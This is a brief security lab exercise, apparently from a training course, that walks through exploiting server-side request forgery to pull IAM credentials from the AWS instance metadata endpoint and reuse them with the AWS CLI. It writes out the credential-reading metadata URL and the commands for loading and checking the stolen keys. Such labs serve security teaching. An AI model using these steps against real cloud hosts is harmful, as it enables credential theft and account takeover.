# Lab 2: Stealing Cloud Metadata

## Goal: Use SSRF to get cloud credentials.

## Scenario:
You found an SSRF vulnerability on a website running on AWS.

## Steps:
1. **Request Metadata**: Use the SSRF to call:
   `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`
2. **Capture Token**: The server will return an `AccessKeyId`, `SecretAccessKey`, and `Token`.
3. **Configure AWS CLI**:
   `aws configure` (Enter the stolen keys).
4. **Check Identity**:
   `aws sts get-caller-identity`
   - This will tell you exactly which role you have stolen.

## Success Check:
- [ ] Successfully captured a cloud token via SSRF.
- [ ] Used the token to identify the cloud role.
